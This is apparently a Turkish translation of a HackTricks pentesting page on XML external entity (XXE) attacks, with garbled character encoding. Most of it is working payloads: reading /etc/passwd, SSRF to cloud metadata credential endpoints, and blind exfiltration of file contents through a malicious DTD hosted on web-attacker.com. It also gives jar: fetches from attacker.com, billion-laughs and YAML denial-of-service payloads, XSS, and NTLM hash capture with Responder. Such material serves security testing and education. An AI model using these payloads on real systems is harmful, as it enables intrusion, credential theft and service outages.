# XXE - XEE - XML Harici VarlÄ±k

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## XML Temelleri

XML, veri depolama ve taÅŸÄ±ma iÃ§in tasarlanmÄ±ÅŸ bir iÅŸaretleme dilidir ve aÃ§Ä±kÃ§a adlandÄ±rÄ±lmÄ±ÅŸ etiketlerin kullanÄ±mÄ±na izin veren esnek bir yapÄ±ya sahiptir. HTML'den farklÄ± olarak, belirli bir dizi Ã¶nceden tanÄ±mlanmÄ±ÅŸ etiketle sÄ±nÄ±rlÄ± olmamasÄ±yla dikkat Ã§eker. XML'in Ã¶nemi, AJAX teknolojisindeki ilk rolÃ¼ne raÄŸmen JSON'un yÃ¼kseliÅŸiyle azalmÄ±ÅŸtÄ±r.

* **VarlÄ±klar AracÄ±lÄ±ÄŸÄ±yla Veri Temsili**: XML'deki varlÄ±klar, `&lt;` ve `&gt;` gibi Ã¶zel karakterler de dahil olmak Ã¼zere verilerin temsil edilmesini saÄŸlar; bu karakterler, XML'in etiket sistemine Ã§akÄ±ÅŸmayÄ± Ã¶nlemek iÃ§in `<` ve `>` ile eÅŸleÅŸir.
* **XML Ã–ÄŸelerinin TanÄ±mlanmasÄ±**: XML, Ã¶ÄŸe tÃ¼rlerinin tanÄ±mlanmasÄ±na izin verir, Ã¶ÄŸelerin nasÄ±l yapÄ±landÄ±rÄ±lmasÄ± gerektiÄŸini ve hangi iÃ§eriÄŸe sahip olabileceÄŸini belirler, her tÃ¼rlÃ¼ iÃ§erikten belirli alt Ã¶ÄŸelere kadar uzanabilir.
* **Belge TÃ¼rÃ¼ TanÄ±mÄ± (DTD)**: DTD'ler, belgenin yapÄ±sÄ±nÄ± ve iÃ§erebileceÄŸi veri tÃ¼rlerini tanÄ±mlamak iÃ§in XML'de Ã¶nemlidir. Ä°Ã§, dÄ±ÅŸ veya bir kombinasyon olabilirler, belgelerin nasÄ±l biÃ§imlendirildiÄŸini ve doÄŸrulandÄ±ÄŸÄ±nÄ± yÃ¶nlendirir.
* **Ã–zel ve Harici VarlÄ±klar**: XML, esnek veri temsili iÃ§in DTD iÃ§inde Ã¶zel varlÄ±klarÄ±n oluÅŸturulmasÄ±nÄ± destekler. URL ile tanÄ±mlanan harici varlÄ±klar, Ã¶zellikle XML Harici VarlÄ±k (XXE) saldÄ±rÄ±larÄ± baÄŸlamÄ±nda gÃ¼venlik endiÅŸelerine neden olur; bu saldÄ±rÄ±lar, XML ayrÄ±ÅŸtÄ±rÄ±cÄ±larÄ±n harici veri kaynaklarÄ±nÄ± nasÄ±l iÅŸlediÄŸini sÃ¶mÃ¼rÃ¼r: `<!DOCTYPE foo [ <!ENTITY myentity "deÄŸer" > ]>`
* **Parametre VarlÄ±klarÄ±yla XXE Tespiti**: Geleneksel yÃ¶ntemlerin ayrÄ±ÅŸtÄ±rÄ±cÄ± gÃ¼venlik Ã¶nlemleri nedeniyle baÅŸarÄ±sÄ±z olduÄŸu durumlarda, XXE zafiyetlerini tespit etmek iÃ§in Ã¶zellikle XML parametre varlÄ±klarÄ± kullanÄ±labilir. Bu varlÄ±klar, DNS sorgularÄ±nÄ± tetikleyerek veya kontrol edilen bir alan adÄ±na HTTP istekleri gÃ¶ndererek zafiyeti doÄŸrulamak iÃ§in dÄ±ÅŸ-bant tespit tekniklerine izin verir.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Ana saldÄ±rÄ±lar

[**Bu saldÄ±rÄ±larÄ±n Ã§oÄŸu harika Portswiggers XEE lablarÄ±nda test edildi: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Yeni VarlÄ±k testi

Bu saldÄ±rÄ±da basit bir yeni VARLIK bildiriminin Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± test edeceÄŸim
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### Dosya okuma

FarklÄ± yollarla `/etc/passwd` dosyasÄ±nÄ± okumayÄ± deneyelim. Windows iÃ§in ÅŸunu okumayÄ± deneyebilirsiniz: `C:\windows\system32\drivers\etc\hosts`

Bu ilk durumda, SYSTEM "_\*\*file:///\*\*etc/passwd_" de Ã§alÄ±ÅŸacaktÄ±r.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Bu ikinci durum, web sunucusunun PHP kullandÄ±ÄŸÄ± durumlarda bir dosya Ã§Ä±karmak iÃ§in faydalÄ± olmalÄ±dÄ±r (Portswiggers lab'Ä±n durumu deÄŸil)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Bu Ã¼Ã§Ã¼ncÃ¼ durumda, `Element stockCheck`'i ANY olarak bildirdiÄŸimize dikkat edin.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
### Dizin listesi

Java tabanlÄ± uygulamalarda, XXE ile ÅŸu ÅŸekilde bir yÃ¼k ile (dosya yerine sadece dizini isteyerek) dizinin iÃ§eriÄŸini listeleyebilirsiniz:
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Bir XXE, bir bulutta iÃ§eride bir SSRF'yi kÃ¶tÃ¼ye kullanmak iÃ§in kullanÄ±labilir.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### KÃ¶r SSRF

**Ã–nceden yorumlanmÄ±ÅŸ teknik** kullanÄ±larak sunucunun, zayÄ±f noktalarÄ±nÄ± gÃ¶stermek iÃ§in kontrol ettiÄŸiniz bir sunucuya eriÅŸmesini saÄŸlayabilirsiniz. Ancak, bu Ã§alÄ±ÅŸmÄ±yorsa, belki de **XML varlÄ±klarÄ±na izin verilmiyordur**, bu durumda **XML parametre varlÄ±klarÄ±nÄ±** deneyebilirsiniz:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "KÃ¶r" SSRF - Verileri dÄ±ÅŸarÄ±ya Ã§Ä±kar

**Bu durumda, sunucuya kÃ¶tÃ¼ niyetli bir yÃ¼k taÅŸÄ±yan yeni bir DTD yÃ¼kleteceÄŸiz ve bir dosyanÄ±n iÃ§eriÄŸini HTTP isteÄŸi aracÄ±lÄ±ÄŸÄ±yla gÃ¶ndereceÄŸiz (**Ã§ok satÄ±rlÄ± dosyalar iÃ§in bunu** _**ftp://**_ **kullanarak dÄ±ÅŸarÄ±ya Ã§Ä±karabilirsiniz** _**ftp://**_ **Ã¶rneÄŸin bu temel sunucuyu kullanarak [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Bu aÃ§Ä±klama** [**Portswiggers lab burada**](https://portswigger.net/web-security/xxe/blind)** temellendirilmiÅŸtir.**

Verileri dÄ±ÅŸarÄ±ya Ã§Ä±karmak iÃ§in kÃ¶tÃ¼ niyetli DTD'de bir dizi adÄ±m gerÃ§ekleÅŸtirilir:

### KÃ¶tÃ¼ Niyetli DTD Ã–rneÄŸi:

YapÄ± aÅŸaÄŸÄ±daki gibidir:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
1. **Parametre Entitelerinin TanÄ±mlanmasÄ±:**
   * Bir XML parametre entitesi, `%file`, `/etc/hostname` dosyasÄ±nÄ±n iÃ§eriÄŸini okuyarak oluÅŸturulur.
   * BaÅŸka bir XML parametre entitesi, `%eval`, tanÄ±mlanÄ±r. Dinamik olarak yeni bir XML parametre entitesi, `%exfiltrate`, bildirir. `%exfiltrate` entitesi, URL'nin sorgu dizgisinde `%file` entitesinin iÃ§eriÄŸini ileterek saldÄ±rganÄ±n sunucusuna HTTP isteÄŸi yapacak ÅŸekilde ayarlanÄ±r.
2. **Entitelerin YÃ¼rÃ¼tÃ¼lmesi:**
   * `%eval` entitesi kullanÄ±larak, `%exfiltrate` entitesinin dinamik bildiriminin yÃ¼rÃ¼tÃ¼lmesi saÄŸlanÄ±r.
   * ArdÄ±ndan `%exfiltrate` entitesi kullanÄ±larak, dosyanÄ±n iÃ§eriÄŸi ile belirtilen URL'ye bir HTTP isteÄŸi baÅŸlatÄ±lÄ±r.

SaldÄ±rgan, bu kÃ¶tÃ¼ amaÃ§lÄ± DTD'yi genellikle `http://web-saldirgan.com/kotu.dtd` gibi kendi kontrolÃ¼ndeki bir sunucuda barÄ±ndÄ±rÄ±r.

**XXE YÃ¼kÃ¼:** Zafiyetli bir uygulamayÄ± sÃ¶mÃ¼rmek iÃ§in saldÄ±rgan bir XXE yÃ¼kÃ¼ gÃ¶nderir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Bu yÃ¼kleme, bir XML ayrÄ±ntÄ± varlÄ±ÄŸÄ± `%xxe` tanÄ±mlar ve bunu DTD iÃ§ine dahil eder. Bir XML ayrÄ±ÅŸtÄ±rÄ±cÄ± tarafÄ±ndan iÅŸlendiÄŸinde, bu yÃ¼kleme saldÄ±rganÄ±n sunucusundan harici DTD'yi getirir. DTD daha sonra iÃ§eride yorumlanÄ±r, kÃ¶tÃ¼ amaÃ§lÄ± DTD'de belirtilen adÄ±mlarÄ± yÃ¼rÃ¼tÃ¼r ve `/etc/hostname` dosyasÄ±nÄ±n saldÄ±rganÄ±n sunucusuna sÄ±zdÄ±rÄ±lmasÄ±na yol aÃ§ar.

### Hata TabanlÄ± (Harici DTD)

**Bu durumda, sunucunun, bir dosyanÄ±n iÃ§eriÄŸini bir hata mesajÄ± iÃ§inde gÃ¶sterecek kÃ¶tÃ¼ amaÃ§lÄ± bir DTD yÃ¼klemesini saÄŸlayacaÄŸÄ±z (bu yalnÄ±zca hata mesajlarÄ±nÄ± gÃ¶rebiliyorsanÄ±z geÃ§erlidir).** [**Buradan Ã¶rnek.**](https://portswigger.net/web-security/xxe/blind)

KÃ¶tÃ¼ amaÃ§lÄ± harici Belge TÃ¼rÃ¼ TanÄ±mÄ± (DTD) kullanÄ±larak, `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini ortaya Ã§Ä±karan bir XML ayrÄ±ÅŸtÄ±rma hatasÄ± mesajÄ± tetiklenebilir. Bu, aÅŸaÄŸÄ±daki adÄ±mlar aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸtirilir:

1. `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini iÃ§eren `file` adlÄ± bir XML ayrÄ±ntÄ± varlÄ±ÄŸÄ± tanÄ±mlanÄ±r.
2. `eval` adlÄ± bir XML parametre varlÄ±ÄŸÄ± tanÄ±mlanÄ±r ve baÅŸka bir XML parametre varlÄ±ÄŸÄ± olan `error` iÃ§in dinamik bir bildirim iÃ§erir. Bu `error` varlÄ±ÄŸÄ± deÄŸerlendirildiÄŸinde, `file` varlÄ±ÄŸÄ±nÄ±n iÃ§eriÄŸini adÄ± olarak iÃ§eren bir varlÄ±k yÃ¼klemeye Ã§alÄ±ÅŸÄ±r.
3. `eval` varlÄ±ÄŸÄ± Ã§aÄŸrÄ±lÄ±r ve `error` varlÄ±ÄŸÄ±nÄ±n dinamik olarak bildirilmesine yol aÃ§ar.
4. `error` varlÄ±ÄŸÄ±nÄ±n Ã§aÄŸrÄ±lmasÄ±, mevcut olmayan bir dosyayÄ± yÃ¼klemeye Ã§alÄ±ÅŸarak, `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini dosya adÄ±nÄ±n bir parÃ§asÄ± olarak iÃ§eren bir hata mesajÄ± Ã¼retir.

KÃ¶tÃ¼ amaÃ§lÄ± harici DTD, aÅŸaÄŸÄ±daki XML ile Ã§aÄŸrÄ±labilir:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### **Hata TabanlÄ± (sistem DTD)**

Peki, **dÄ±ÅŸ baÄŸlantÄ±lar engellendiÄŸinde** kÃ¶r XXE zafiyetleri ne olacak?.

XML dilindeki bir aÃ§Ä±klÄ±k, bir belgenin DTD'sinin iÃ§ ve dÄ±ÅŸ deklarasyonlarÄ± karÄ±ÅŸtÄ±rdÄ±ÄŸÄ±nda **hassas verilerin hata mesajlarÄ± aracÄ±lÄ±ÄŸÄ±yla ortaya Ã§Ä±kmasÄ±na neden olabilir**. Bu sorun, dÄ±ÅŸarÄ±dan ve iÃ§eriden deklare edilen varlÄ±klarÄ±n iÃ§eriÄŸini yeniden tanÄ±mlamayÄ± mÃ¼mkÃ¼n kÄ±larak hata tabanlÄ± XXE saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesine olanak tanÄ±r. Bu tÃ¼r saldÄ±rÄ±lar, dÄ±ÅŸ bir DTD'de orijinal olarak deklare edilen bir XML parametre varlÄ±ÄŸÄ±nÄ±n, iÃ§ bir DTD iÃ§inden yeniden tanÄ±mlanmasÄ±nÄ± sÃ¶mÃ¼rÃ¼r. Sunucu tarafÄ±ndan dÄ±ÅŸ baÄŸlantÄ±lar engellendiÄŸinde, saldÄ±rganlarÄ±n hassas bilgileri ortaya Ã§Ä±karmak iÃ§in yerel DTD dosyalarÄ±na gÃ¼venmesi gerekmektedir.

Sunucunun dosya sisteminde `/usr/local/app/schema.dtd` konumunda bir DTD dosyasÄ± bulunduÄŸunu ve `custom_entity` adÄ±nda bir varlÄ±k tanÄ±mladÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nelim. Bir saldÄ±rgan, aÅŸaÄŸÄ±daki gibi bir karma DTD gÃ¶ndererek `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini ortaya Ã§Ä±karan bir XML ayrÄ±ÅŸtÄ±rma hatasÄ± oluÅŸturabilir:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
AÅŸaÄŸÄ±daki adÄ±mlar bu DTD tarafÄ±ndan yÃ¼rÃ¼tÃ¼lÃ¼r:

* Sunucunun dosya sisteminde bulunan harici DTD dosyasÄ±nÄ± iÃ§eren `local_dtd` adÄ±nda bir XML parametre varlÄ±ÄŸÄ±nÄ±n tanÄ±mÄ± yapÄ±lÄ±r.
* Harici DTD'de orijinal olarak tanÄ±mlanan `custom_entity` XML parametre varlÄ±ÄŸÄ± iÃ§in bir yeniden tanÄ±mlama gerÃ§ekleÅŸir ve `/etc/passwd` dosyasÄ±nÄ±n iÃ§eriÄŸini ortaya Ã§Ä±karmak iÃ§in bir [hata tabanlÄ± XXE saldÄ±rÄ±sÄ±nÄ±](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) kapsamasÄ± amaÃ§lanÄ±r. Bu yeniden tanÄ±mlama, bir ayrÄ±ÅŸtÄ±rma hatasÄ± ortaya Ã§Ä±karmak Ã¼zere tasarlanmÄ±ÅŸtÄ±r.
* `local_dtd` varlÄ±ÄŸÄ±nÄ± kullanarak, harici DTD etkinleÅŸtirilir ve yeni tanÄ±mlanan `custom_entity` kapsanÄ±r. Bu adÄ±mlar dizisi, saldÄ±rÄ± tarafÄ±ndan hedeflenen hata mesajÄ±nÄ±n yayÄ±nlanmasÄ±na neden olur.

**GerÃ§ek dÃ¼nya Ã¶rneÄŸi:** GNOME masaÃ¼stÃ¼ ortamÄ±nÄ± kullanan sistemler genellikle `/usr/share/yelp/dtd/docbookx.dtd` konumunda bir DTD iÃ§erir ve bu DTD'de `ISOamso` adÄ±nda bir varlÄ±k bulunur.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Bu teknik bir **iÃ§ DTD** kullandÄ±ÄŸÄ±ndan Ã¶nce geÃ§erli bir tane bulmanÄ±z gerekmektedir. Bunun iÃ§in sunucunun kullandÄ±ÄŸÄ± **iÅŸletim sistemi/YazÄ±lÄ±mÄ±** yÃ¼kleyerek ve **varsayÄ±lan DTD'leri arayarak** veya sistemler iÃ§indeki varsayÄ±lan DTD'lerin bir listesini **edinebilir** ve var olup olmadÄ±ÄŸÄ±nÄ± **kontrol edebilirsiniz**:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Daha fazla bilgi iÃ§in [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Sistem iÃ§indeki DTD'leri Bulma

AÅŸaÄŸÄ±daki harika github deposunda **sistemde bulunabilecek DTD'lerin yollarÄ±nÄ±** bulabilirsiniz:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

AyrÄ±ca, **kurban sistemin Docker gÃ¶rÃ¼ntÃ¼sÃ¼ne** sahipseniz, aynÄ± depodaki aracÄ± kullanarak **gÃ¶rÃ¼ntÃ¼yÃ¼ tarama** ve **sistem iÃ§inde bulunan DTD'lerin yolunu bulma** imkanÄ±nÄ±z vardÄ±r. NasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in [githubÄ±n Readme dosyasÄ±nÄ±](https://github.com/GoSecure/dtd-finder) okuyun.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### Ofis AÃ§Ä±k XML AyrÄ±ÅŸtÄ±rÄ±cÄ±larÄ± AracÄ±lÄ±ÄŸÄ±yla XXE

Bu saldÄ±rÄ±nÄ±n daha detaylÄ± bir aÃ§Ä±klamasÄ± iÃ§in, [bu harika yazÄ±nÄ±n ikinci bÃ¶lÃ¼mÃ¼ne](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **Detectify**'dan bakabilirsiniz.

**BirÃ§ok web uygulamasÄ±, Microsoft Office belgelerini yÃ¼klemeyi saÄŸlar**, ardÄ±ndan bu belgelerden belirli detaylarÄ± Ã§Ä±karmaya devam eder. Ã–rneÄŸin, bir web uygulamasÄ± kullanÄ±cÄ±larÄ±n XLSX formatÄ±nda bir elektronik tablo yÃ¼kleyerek veri aktarmasÄ±na izin verebilir. AyrÄ±ÅŸtÄ±rÄ±cÄ±nÄ±n elektronik tablodan verileri Ã§Ä±karmasÄ± iÃ§in en az bir XML dosyasÄ±nÄ± ayrÄ±ÅŸtÄ±rmasÄ± gerekecektir.

Bu zafiyeti test etmek iÃ§in, **XXE yÃ¼klemesi iÃ§eren bir Microsoft Office dosyasÄ± oluÅŸturmak gereklidir**. Ä°lk adÄ±m, belgenin aÃ§Ä±lacaÄŸÄ± boÅŸ bir dizin oluÅŸturmaktÄ±r.

Belge aÃ§Ä±ldÄ±ktan sonra, `./unzipped/word/document.xml` konumundaki XML dosyasÄ± tercih edilen bir metin dÃ¼zenleyicide (Ã¶rneÄŸin vim) aÃ§Ä±lÄ±p dÃ¼zenlenmelidir. XML, genellikle bir HTTP isteÄŸi ile baÅŸlayan istenilen XXE yÃ¼klemesini iÃ§erecek ÅŸekilde deÄŸiÅŸtirilmelidir.

DeÄŸiÅŸtirilmiÅŸ XML satÄ±rlarÄ± iki kÃ¶k XML nesnesi arasÄ±na yerleÅŸtirilmelidir. Ä°stekler iÃ§in izlenebilir bir URL ile URL'nin deÄŸiÅŸtirilmesi Ã¶nemlidir.

Son olarak, kÃ¶tÃ¼ niyetli poc.docx dosyasÄ±nÄ± oluÅŸturmak iÃ§in dosya sÄ±kÄ±ÅŸtÄ±rÄ±labilir. Ã–nceden oluÅŸturulan "unzipped" dizininden, aÅŸaÄŸÄ±daki komut Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r:

Åimdi, oluÅŸturulan dosya potansiyel olarak savunmasÄ±z web uygulamasÄ±na yÃ¼klenebilir ve bir isteÄŸin Burp Collaborator gÃ¼nlÃ¼klerinde gÃ¶rÃ¼nmesi umulabilir.

### Jar: ProtokolÃ¼

**jar** protokolÃ¼ yalnÄ±zca **Java uygulamalarÄ±** iÃ§inde eriÅŸilebilir hale getirilmiÅŸtir. Bu, hem yerel hem de uzak dosyalara eriÅŸimi saÄŸlamak Ã¼zere tasarlanmÄ±ÅŸtÄ±r ve bir **PKZIP** arÅŸivinde (Ã¶rneÄŸin `.zip`, `.jar`, vb.) dosya eriÅŸimini saÄŸlamayÄ± amaÃ§lar.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
PKZIP dosyalarÄ± iÃ§indeki dosyalara eriÅŸebilmek, sistem DTD dosyalarÄ± aracÄ±lÄ±ÄŸÄ±yla XXE'yi kÃ¶tÃ¼ye kullanmak iÃ§in **son derece faydalÄ±dÄ±r.** Sistem DTD dosyalarÄ±nÄ± kÃ¶tÃ¼ye nasÄ±l kullanacaÄŸÄ±nÄ±zÄ± Ã¶ÄŸrenmek iÃ§in [bu bÃ¶lÃ¼me](xxe-xee-xml-external-entity.md#error-based-system-dtd) bakÄ±n.
{% endhint %}

PKZIP arÅŸivi iÃ§indeki bir dosyaya jar protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla eriÅŸme sÃ¼reci birkaÃ§ adÄ±m iÃ§erir:

1. Belirtilen konumdan (`https://download.website.com/archive.zip` gibi) zip arÅŸivini indirmek iÃ§in bir HTTP isteÄŸi yapÄ±lÄ±r.
2. ArÅŸivi iÃ§eren HTTP yanÄ±tÄ± geÃ§ici olarak genellikle `/tmp/...` gibi bir konumda sistemde saklanÄ±r.
3. ArÅŸivin iÃ§eriÄŸine eriÅŸmek iÃ§in arÅŸiv aÃ§Ä±lÄ±r.
4. ArÅŸiv iÃ§indeki belirli dosya, `file.zip`, okunur.
5. Bu iÅŸlem sonrasÄ±nda, bu sÃ¼reÃ§te oluÅŸturulan geÃ§ici dosyalar silinir.

Bu sÃ¼reci ikinci adÄ±mda kesintiye uÄŸratmanÄ±n ilginÃ§ bir tekniÄŸi, arÅŸiv dosyasÄ±nÄ± sunarken sunucu baÄŸlantÄ±sÄ±nÄ± sÃ¼rekli aÃ§Ä±k tutmaktÄ±r. Bu amaÃ§la [bu depoda](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) bulunan araÃ§lar kullanÄ±labilir, bunlar arasÄ±nda bir Python sunucusu (`slow_http_server.py`) ve bir Java sunucusu (`slowserver.jar`) bulunmaktadÄ±r.
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
GeÃ§ici bir dizine dosya yazmak, yerel dosya dahil etme, ÅŸablon enjeksiyonu, XSLT RCE, serileÅŸtirme vb. bir yol geÃ§iÅŸi iÃ§eren baÅŸka bir zafiyeti **artÄ±rmanÄ±za yardÄ±mcÄ± olabilir**.
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Milyar GÃ¼ldÃ¼rme SaldÄ±rÄ±sÄ±
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Yaml SaldÄ±rÄ±sÄ±
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Kare KÃ¶k SaldÄ±rÄ±sÄ±

![](<../.gitbook/assets/image (531).png>)

#### NTML Almak

Windows ana bilgisayarlarÄ±nda, bir yanÄ±tlayÄ±cÄ±.py iÅŸleyici ayarlayarak web sunucusu kullanÄ±cÄ±sÄ±nÄ±n NTML Ã¶zetini almak mÃ¼mkÃ¼ndÃ¼r:
```bash
Responder.py -I eth0 -v
```
ve aÅŸaÄŸÄ±daki isteÄŸi gÃ¶ndererek
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Gizli XXE YÃ¼zeyleri

### XInclude

MÃ¼ÅŸteri verilerini sunucu tarafÄ±ndaki XML belgelerine entegre ederken, arka uÃ§ SOAP isteklerinde olduÄŸu gibi, XML yapÄ±sÄ± Ã¼zerinde doÄŸrudan kontrol genellikle sÄ±nÄ±rlÄ±dÄ±r, bu da `DOCTYPE` Ã¶ÄŸesini deÄŸiÅŸtirme konusundaki kÄ±sÄ±tlamalar nedeniyle geleneksel XXE saldÄ±rÄ±larÄ±nÄ± engeller. Bununla birlikte, bir `XInclude` saldÄ±rÄ±sÄ±, XML belgesinin herhangi bir veri Ã¶ÄŸesine harici varlÄ±klarÄ±n eklenmesine izin vererek bir Ã§Ã¶zÃ¼m sunar. Bu yÃ¶ntem, sunucu tarafÄ±nda oluÅŸturulan XML belgesinin yalnÄ±zca bir kÄ±smÄ± kontrol edilebildiÄŸinde bile etkilidir.

